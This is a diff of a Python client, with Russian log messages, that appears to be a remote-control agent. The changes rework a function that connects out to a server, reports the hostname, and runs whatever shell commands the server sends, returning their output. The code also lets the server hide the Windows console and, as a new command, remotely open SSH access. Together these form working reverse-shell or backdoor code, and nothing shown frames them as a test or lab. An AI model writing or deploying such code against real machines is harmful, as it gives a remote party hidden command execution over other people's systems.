@@ -72,24 +72,37 @@ def remote_shell_client(server_ip):
     try:
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
             s.connect((server_ip, SHELL_PORT))
-            while True:
-                cmd_bytes = s.recv(4096)
-                if not cmd_bytes: break
-                cmd_str = cmd_bytes.decode('utf-8', errors='ignore').strip()
-                if cmd_str.lower() == 'exit': break
+            with s.makefile("rwb") as stream:
+                stream.write(
+                    (json.dumps({"hostname": platform.node()}) + "\n").encode("utf-8")
+                )
+                stream.flush()
 
-                try:
-                    res = subprocess.run(cmd_str, shell=True, capture_output=True, timeout=15)
+                for line in stream:
+                    request = json.loads(line.decode("utf-8"))
+                    cmd_str = request.get("command", "")
                     try:
-                        out_str = res.stdout.decode('cp866') + res.stderr.decode('cp866')
-                    except:
-                        out_str = res.stdout.decode('utf-8', errors='ignore') + res.stderr.decode('utf-8', errors='ignore')
-                except Exception as e:
-                    out_str = f"Ошибка: {e}\n"
+                        res = subprocess.run(
+                            cmd_str,
+                            shell=True,
+                            capture_output=True,
+                            timeout=15,
+                        )
+                        try:
+                            out_str = res.stdout.decode("cp866") + res.stderr.decode("cp866")
+                        except UnicodeDecodeError:
+                            out_str = res.stdout.decode("utf-8", errors="replace") + res.stderr.decode(
+                                "utf-8", errors="replace"
+                            )
+                    except Exception as e:
+                        out_str = f"Ошибка: {e}\n"
 
-                if not out_str:
-                    out_str = "Команда выполнена, вывод пуст.\n"
-                s.sendall(out_str.encode('utf-8', errors='ignore'))
+                    if not out_str:
+                        out_str = "Команда выполнена, вывод пуст.\n"
+                    stream.write(
+                        (json.dumps({"output": out_str}) + "\n").encode("utf-8")
+                    )
+                    stream.flush()
     except Exception as e:
         log_message(f"Удаленный сеанс терминала завершен: {e}")
 
@@ -117,9 +130,9 @@ def clear_temp_files():
 
 def handle_server_command(cmd, server_ip):
     global console_allocated
-    if platform.system() != "Windows": return
+    is_windows = platform.system() == "Windows"
 
-    if cmd == "SHOW" and not console_allocated:
+    if cmd == "SHOW" and is_windows and not console_allocated:
         try:
             ctypes.windll.kernel32.AllocConsole()
             sys.stdout = open("CONOUT$", "w", encoding="utf-8", buffering=1)
@@ -128,7 +141,7 @@ def handle_server_command(cmd, server_ip):
             log_message("Консоль показана")
         except Exception as e:
             log_message(f"Ошибка SHOW: {e}")
-    elif cmd == "HIDE" and console_allocated:
+    elif cmd == "HIDE" and is_windows and console_allocated:
         try:
             ctypes.windll.kernel32.FreeConsole()
             console_allocated = False
@@ -144,7 +157,11 @@ def handle_server_command(cmd, server_ip):
     elif cmd == "SHUTDOWN":
         log_message("Получена команда SHUTDOWN от сервера. Завершаем процесс.")
         time.sleep(0.5)
-        sys.exit(0)  # Корректный выход, а не taskkill
+        sys.exit(0)  
+    elif cmd == "OPEN_SSH":
+        log_message("Получена команда OPEN_SSH от сервера. Настраиваем SSH.")
+       
+        threading.Thread(target=Metrics.open_ssh, daemon=True).start()
 
 
 def setup_agent_firewall():
